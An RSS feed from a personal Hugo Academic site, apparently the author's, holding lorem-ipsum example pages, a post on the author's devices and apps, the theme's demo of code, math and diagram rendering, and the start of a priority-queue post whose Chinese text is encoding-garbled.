<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Terry Tang</title><link>http://www.guozet.me/</link><atom:link href="http://www.guozet.me/index.xml" rel="self" type="application/rss+xml"/><description>Terry Tang</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><copyright>guozet.me Â© 2020</copyright><lastBuildDate>Thu, 14 Nov 2019 21:42:52 +0000</lastBuildDate><image><url>http://www.guozet.me/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_2.png</url><title>Terry Tang</title><link>http://www.guozet.me/</link></image><item><title>Example Page 1</title><link>http://www.guozet.me/courses/example/example1/</link><pubDate>Sun, 05 May 2019 00:00:00 +0100</pubDate><guid>http://www.guozet.me/courses/example/example1/</guid><description>&lt;p>In this tutorial, I&amp;rsquo;ll share my top 10 tips for getting started with Academic:&lt;/p>
&lt;h2 id="tip-1">Tip 1&lt;/h2>
&lt;p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.&lt;/p>
&lt;p>Nullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.&lt;/p>
&lt;p>Cras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.&lt;/p>
&lt;p>Suspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.&lt;/p>
&lt;p>Aliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.&lt;/p>
&lt;h2 id="tip-2">Tip 2&lt;/h2>
&lt;p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.&lt;/p>
&lt;p>Nullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.&lt;/p>
&lt;p>Cras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.&lt;/p>
&lt;p>Suspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.&lt;/p>
&lt;p>Aliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.&lt;/p></description></item><item><title>Example Page 2</title><link>http://www.guozet.me/courses/example/example2/</link><pubDate>Sun, 05 May 2019 00:00:00 +0100</pubDate><guid>http://www.guozet.me/courses/example/example2/</guid><description>&lt;p>Here are some more tips for getting started with Academic:&lt;/p>
&lt;h2 id="tip-3">Tip 3&lt;/h2>
&lt;p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.&lt;/p>
&lt;p>Nullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.&lt;/p>
&lt;p>Cras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.&lt;/p>
&lt;p>Suspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.&lt;/p>
&lt;p>Aliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.&lt;/p>
&lt;h2 id="tip-4">Tip 4&lt;/h2>
&lt;p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.&lt;/p>
&lt;p>Nullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.&lt;/p>
&lt;p>Cras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.&lt;/p>
&lt;p>Suspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.&lt;/p>
&lt;p>Aliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.&lt;/p></description></item><item><title>My workbench and Productivity tools</title><link>http://www.guozet.me/post/My-workbench-and-Productivity-tools/</link><pubDate>Thu, 14 Nov 2019 21:42:52 +0000</pubDate><guid>http://www.guozet.me/post/My-workbench-and-Productivity-tools/</guid><description>&lt;!-- TOC -->
&lt;ul>
&lt;li>
&lt;a href="#hardware">Hardware&lt;/a>
&lt;ul>
&lt;li>
&lt;a href="#laptop">Laptop&lt;/a>&lt;/li>
&lt;li>
&lt;a href="#mobile-phone">Mobile Phone&lt;/a>&lt;/li>
&lt;li>
&lt;a href="#accessories">Accessories&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;a href="#software">Software&lt;/a>
&lt;ul>
&lt;li>
&lt;a href="#laptop-apps">Laptop Apps&lt;/a>&lt;/li>
&lt;li>
&lt;a href="#ios-apps">iOS Apps&lt;/a>&lt;/li>
&lt;li>
&lt;a href="#cloud-based-apps">Cloud-based Apps&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;!-- /TOC -->
&lt;h1 id="hardware">Hardware&lt;/h1>
&lt;h2 id="laptop">Laptop&lt;/h2>
&lt;p>&lt;strong>Acer R11 Chromebook(11.5 inch, 2018)&lt;/strong>&lt;/p>
&lt;p>Information:&lt;/p>
&lt;ul>
&lt;li>2018 year&lt;/li>
&lt;li>11.6&amp;rdquo; HD (1366 x 768) 16:9 IPS&lt;/li>
&lt;li>4 GB, DDR3L SDRAM, 32 GB SSD&lt;/li>
&lt;li>IntelÂ® CeleronÂ® N3150 processor Quad-core 1.60 GHz&lt;/li>
&lt;li>System: GalliumOS(xUbuntu)&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;h2 id="mobile-phone">Mobile Phone&lt;/h2>
&lt;p>&lt;strong>iPhone 7 Plus(128GB)&lt;/strong>&lt;/p>
&lt;p>I like the iOS system. It&amp;rsquo;s simple and good for me to keep touch with my friends.&lt;/p>
&lt;h2 id="accessories">Accessories&lt;/h2>
&lt;p>&lt;strong>iPad Pro(10.5 inch, 2017)&lt;/strong>&lt;/p>
&lt;p>This iPad is my favorites produce. I usually use it to do somethings like follow:&lt;/p>
&lt;ul>
&lt;li>Reading PDF files&lt;/li>
&lt;li>Write some post by markdown&lt;/li>
&lt;/ul>
&lt;h1 id="software">Software&lt;/h1>
&lt;h2 id="laptop-apps">Laptop Apps&lt;/h2>
&lt;ul>
&lt;li>Chrome&lt;/li>
&lt;li>VS code&lt;/li>
&lt;li>Electron-SSR&lt;/li>
&lt;li>AnyConnect&lt;/li>
&lt;/ul>
&lt;h2 id="ios-apps">iOS Apps&lt;/h2>
&lt;p>&lt;strong>Security&amp;amp;Network&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;a href="https://duo.com/product/trusted-users/two-factor-authentication/duo-mobile" target="_blank" rel="noopener">Duo Mobile&lt;/a>:Secure Two-Factor Authentication App. Secure access to work and personal, cloud and on-premises apps with one simple app.&lt;/li>
&lt;li>
&lt;a href="https://www.lastpass.com/" target="_blank" rel="noopener">Lastpass&lt;/a>:A freemium password manager that stores encrypted passwords online.&lt;/li>
&lt;li>VPN: AnyConnect, Quantumult&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Productivity&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>IFTTT&lt;/li>
&lt;li>Shortcuts&lt;/li>
&lt;li>Scannable&lt;/li>
&lt;li>Dropbox&lt;/li>
&lt;li>OfficeSuite&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Study&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>GoodNotes&lt;/li>
&lt;li>Eudic&lt;/li>
&lt;li>Aboboo&lt;/li>
&lt;li>Reeder&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Health&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>keep&lt;/li>
&lt;li>MyFitnesspal&lt;/li>
&lt;li>YUNMAI&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Finance&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;a href="https://www.mint.com/" target="_blank" rel="noopener">Mint&lt;/a>: Record all the cost from my bank.(We bring together all of your accounts, bills and more, so you can conveniently manage your finances from one dashboard.)&lt;/li>
&lt;li>éæè®°:Set the budget and record each cost by myself.&lt;/li>
&lt;/ul>
&lt;h2 id="cloud-based-apps">Cloud-based Apps&lt;/h2>
&lt;ul>
&lt;li>
&lt;a href="https://ifttt.com/" target="_blank" rel="noopener">IFTTT&lt;/a>: Setup automation between apps and service.&lt;/li>
&lt;li>
&lt;a href="https://aws.amazon.com/" target="_blank" rel="noopener">AWS&lt;/a>(Amazon Web services): Cloud computing&lt;/li>
&lt;li>Github&lt;/li>
&lt;li>Travis CI&lt;/li>
&lt;/ul></description></item><item><title>Writing technical content in Academic</title><link>http://www.guozet.me/post/writing-technical-content/</link><pubDate>Fri, 12 Jul 2019 00:00:00 +0000</pubDate><guid>http://www.guozet.me/post/writing-technical-content/</guid><description>&lt;p>Academic is designed to give technical content creators a seamless experience. You can focus on the content and Academic handles the rest.&lt;/p>
&lt;p>&lt;strong>Highlight your code snippets, take notes on math classes, and draw diagrams from textual representation.&lt;/strong>&lt;/p>
&lt;p>On this page, you&amp;rsquo;ll find some examples of the types of technical content that can be rendered with Academic.&lt;/p>
&lt;h2 id="examples">Examples&lt;/h2>
&lt;h3 id="code">Code&lt;/h3>
&lt;p>Academic supports a Markdown extension for highlighting code syntax. You can enable this feature by toggling the &lt;code>highlight&lt;/code> option in your &lt;code>config/_default/params.toml&lt;/code> file.&lt;/p>
&lt;pre>&lt;code>```python
import pandas as pd
data = pd.read_csv(&amp;quot;data.csv&amp;quot;)
data.head()
```
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;pre>&lt;code class="language-python">import pandas as pd
data = pd.read_csv(&amp;quot;data.csv&amp;quot;)
data.head()
&lt;/code>&lt;/pre>
&lt;h3 id="math">Math&lt;/h3>
&lt;p>Academic supports a Markdown extension for $\LaTeX$ math. You can enable this feature by toggling the &lt;code>math&lt;/code> option in your &lt;code>config/_default/params.toml&lt;/code> file.&lt;/p>
&lt;p>To render &lt;em>inline&lt;/em> or &lt;em>block&lt;/em> math, wrap your LaTeX math with &lt;code>$...$&lt;/code> or &lt;code>$$...$$&lt;/code>, respectively.&lt;/p>
&lt;p>Example &lt;strong>math block&lt;/strong>:&lt;/p>
&lt;pre>&lt;code class="language-tex">$$\gamma_{n} = \frac{
\left | \left (\mathbf x_{n} - \mathbf x_{n-1} \right )^T
\left [\nabla F (\mathbf x_{n}) - \nabla F (\mathbf x_{n-1}) \right ] \right |}
{\left \|\nabla F(\mathbf{x}_{n}) - \nabla F(\mathbf{x}_{n-1}) \right \|^2}$$
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;p>$$\gamma_{n} = \frac{ \left | \left (\mathbf x_{n} - \mathbf x_{n-1} \right )^T \left [\nabla F (\mathbf x_{n}) - \nabla F (\mathbf x_{n-1}) \right ] \right |}{\left |\nabla F(\mathbf{x}_{n}) - \nabla F(\mathbf{x}_{n-1}) \right |^2}$$&lt;/p>
&lt;p>Example &lt;strong>inline math&lt;/strong> &lt;code>$\nabla F(\mathbf{x}_{n})$&lt;/code> renders as $\nabla F(\mathbf{x}_{n})$.&lt;/p>
&lt;p>Example &lt;strong>multi-line math&lt;/strong> using the &lt;code>\\\\&lt;/code> math linebreak:&lt;/p>
&lt;pre>&lt;code class="language-tex">$$f(k;p_0^*) = \begin{cases} p_0^* &amp;amp; \text{if }k=1, \\\\
1-p_0^* &amp;amp; \text {if }k=0.\end{cases}$$
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;p>$$f(k;p_0^*) = \begin{cases} p_0^* &amp;amp; \text{if }k=1, \\&lt;br>
1-p_0^* &amp;amp; \text {if }k=0.\end{cases}$$&lt;/p>
&lt;h3 id="diagrams">Diagrams&lt;/h3>
&lt;p>Academic supports a Markdown extension for diagrams. You can enable this feature by toggling the &lt;code>diagram&lt;/code> option in your &lt;code>config/_default/params.toml&lt;/code> file or by adding &lt;code>diagram: true&lt;/code> to your page front matter.&lt;/p>
&lt;p>An example &lt;strong>flowchart&lt;/strong>:&lt;/p>
&lt;pre>&lt;code>```mermaid
graph TD
A[Hard] --&amp;gt;|Text| B(Round)
B --&amp;gt; C{Decision}
C --&amp;gt;|One| D[Result 1]
C --&amp;gt;|Two| E[Result 2]
```
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;pre>&lt;code class="language-mermaid">graph TD
A[Hard] --&amp;gt;|Text| B(Round)
B --&amp;gt; C{Decision}
C --&amp;gt;|One| D[Result 1]
C --&amp;gt;|Two| E[Result 2]
&lt;/code>&lt;/pre>
&lt;p>An example &lt;strong>sequence diagram&lt;/strong>:&lt;/p>
&lt;pre>&lt;code>```mermaid
sequenceDiagram
Alice-&amp;gt;&amp;gt;John: Hello John, how are you?
loop Healthcheck
John-&amp;gt;&amp;gt;John: Fight against hypochondria
end
Note right of John: Rational thoughts!
John--&amp;gt;&amp;gt;Alice: Great!
John-&amp;gt;&amp;gt;Bob: How about you?
Bob--&amp;gt;&amp;gt;John: Jolly good!
```
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;pre>&lt;code class="language-mermaid">sequenceDiagram
Alice-&amp;gt;&amp;gt;John: Hello John, how are you?
loop Healthcheck
John-&amp;gt;&amp;gt;John: Fight against hypochondria
end
Note right of John: Rational thoughts!
John--&amp;gt;&amp;gt;Alice: Great!
John-&amp;gt;&amp;gt;Bob: How about you?
Bob--&amp;gt;&amp;gt;John: Jolly good!
&lt;/code>&lt;/pre>
&lt;p>An example &lt;strong>Gantt diagram&lt;/strong>:&lt;/p>
&lt;pre>&lt;code>```mermaid
gantt
section Section
Completed :done, des1, 2014-01-06,2014-01-08
Active :active, des2, 2014-01-07, 3d
Parallel 1 : des3, after des1, 1d
Parallel 2 : des4, after des1, 1d
Parallel 3 : des5, after des3, 1d
Parallel 4 : des6, after des4, 1d
```
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;pre>&lt;code class="language-mermaid">gantt
section Section
Completed :done, des1, 2014-01-06,2014-01-08
Active :active, des2, 2014-01-07, 3d
Parallel 1 : des3, after des1, 1d
Parallel 2 : des4, after des1, 1d
Parallel 3 : des5, after des3, 1d
Parallel 4 : des6, after des4, 1d
&lt;/code>&lt;/pre>
&lt;p>An example &lt;strong>class diagram&lt;/strong>:&lt;/p>
&lt;pre>&lt;code>```mermaid
classDiagram
Class01 &amp;lt;|-- AveryLongClass : Cool
&amp;lt;&amp;lt;interface&amp;gt;&amp;gt; Class01
Class09 --&amp;gt; C2 : Where am i?
Class09 --* C3
Class09 --|&amp;gt; Class07
Class07 : equals()
Class07 : Object[] elementData
Class01 : size()
Class01 : int chimp
Class01 : int gorilla
class Class10 {
&amp;lt;&amp;lt;service&amp;gt;&amp;gt;
int id
size()
}
```
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;pre>&lt;code class="language-mermaid">classDiagram
Class01 &amp;lt;|-- AveryLongClass : Cool
&amp;lt;&amp;lt;interface&amp;gt;&amp;gt; Class01
Class09 --&amp;gt; C2 : Where am i?
Class09 --* C3
Class09 --|&amp;gt; Class07
Class07 : equals()
Class07 : Object[] elementData
Class01 : size()
Class01 : int chimp
Class01 : int gorilla
class Class10 {
&amp;lt;&amp;lt;service&amp;gt;&amp;gt;
int id
size()
}
&lt;/code>&lt;/pre>
&lt;p>An example &lt;strong>state diagram&lt;/strong>:&lt;/p>
&lt;pre>&lt;code>```mermaid
stateDiagram
[*] --&amp;gt; Still
Still --&amp;gt; [*]
Still --&amp;gt; Moving
Moving --&amp;gt; Still
Moving --&amp;gt; Crash
Crash --&amp;gt; [*]
```
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;pre>&lt;code class="language-mermaid">stateDiagram
[*] --&amp;gt; Still
Still --&amp;gt; [*]
Still --&amp;gt; Moving
Moving --&amp;gt; Still
Moving --&amp;gt; Crash
Crash --&amp;gt; [*]
&lt;/code>&lt;/pre>
&lt;h3 id="todo-lists">Todo lists&lt;/h3>
&lt;p>You can even write your todo lists in Academic too:&lt;/p>
&lt;pre>&lt;code class="language-markdown">- [x] Write math example
- [x] Write diagram example
- [ ] Do something else
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;ul>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> Write math example&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> Write diagram example&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> Do something else&lt;/li>
&lt;/ul>
&lt;h3 id="tables">Tables&lt;/h3>
&lt;p>Represent your data in tables:&lt;/p>
&lt;pre>&lt;code class="language-markdown">| First Header | Second Header |
| ------------- | ------------- |
| Content Cell | Content Cell |
| Content Cell | Content Cell |
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>First Header&lt;/th>
&lt;th>Second Header&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Content Cell&lt;/td>
&lt;td>Content Cell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content Cell&lt;/td>
&lt;td>Content Cell&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="asides">Asides&lt;/h3>
&lt;p>Academic supports a
&lt;a href="https://sourcethemes.com/academic/docs/writing-markdown-latex/#alerts" target="_blank" rel="noopener">shortcode for asides&lt;/a>, also referred to as &lt;em>notices&lt;/em>, &lt;em>hints&lt;/em>, or &lt;em>alerts&lt;/em>. By wrapping a paragraph in &lt;code>{{% alert note %}} ... {{% /alert %}}&lt;/code>, it will render as an aside.&lt;/p>
&lt;pre>&lt;code class="language-markdown">{{% alert note %}}
A Markdown aside is useful for displaying notices, hints, or definitions to your readers.
{{% /alert %}}
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;div class="alert alert-note">
&lt;div>
A Markdown aside is useful for displaying notices, hints, or definitions to your readers.
&lt;/div>
&lt;/div>
&lt;h3 id="icons">Icons&lt;/h3>
&lt;p>Academic enables you to use a wide range of
&lt;a href="https://sourcethemes.com/academic/docs/page-builder/#icons" target="_blank" rel="noopener">icons from &lt;em>Font Awesome&lt;/em> and &lt;em>Academicons&lt;/em>&lt;/a> in addition to
&lt;a href="https://sourcethemes.com/academic/docs/writing-markdown-latex/#emojis" target="_blank" rel="noopener">emojis&lt;/a>.&lt;/p>
&lt;p>Here are some examples using the &lt;code>icon&lt;/code> shortcode to render icons:&lt;/p>
&lt;pre>&lt;code class="language-markdown">{{&amp;lt; icon name=&amp;quot;terminal&amp;quot; pack=&amp;quot;fas&amp;quot; &amp;gt;}} Terminal
{{&amp;lt; icon name=&amp;quot;python&amp;quot; pack=&amp;quot;fab&amp;quot; &amp;gt;}} Python
{{&amp;lt; icon name=&amp;quot;r-project&amp;quot; pack=&amp;quot;fab&amp;quot; &amp;gt;}} R
&lt;/code>&lt;/pre>
&lt;p>renders as&lt;/p>
&lt;p>
&lt;i class="fas fa-terminal pr-1 fa-fw">&lt;/i> Terminal&lt;br>
&lt;i class="fab fa-python pr-1 fa-fw">&lt;/i> Python&lt;br>
&lt;i class="fab fa-r-project pr-1 fa-fw">&lt;/i> R&lt;/p>
&lt;h3 id="did-you-find-this-page-helpful-consider-sharing-it-">Did you find this page helpful? Consider sharing it ð&lt;/h3></description></item><item><title>ç®æ³åæä¸è®¾è®¡ï¼ä¼åçº§éå</title><link>http://www.guozet.me/post/Algorithm-Priority-Queue/</link><pubDate>Thu, 02 May 2019 20:11:53 +0000</pubDate><guid>http://www.guozet.me/post/Algorithm-Priority-Queue/</guid><description>&lt;h1 id="ä¼åçº§éå">ä¼åçº§éå&lt;/h1>
&lt;p>ä¼åçº§éåï¼éåä¸­çåç´ å¸¦æä¼åçº§ï¼åç´ æç§ä¼åçº§ä¸åå¤äºéåä¸­çä¸åä½ç½®ï¼&lt;/p>
&lt;blockquote>
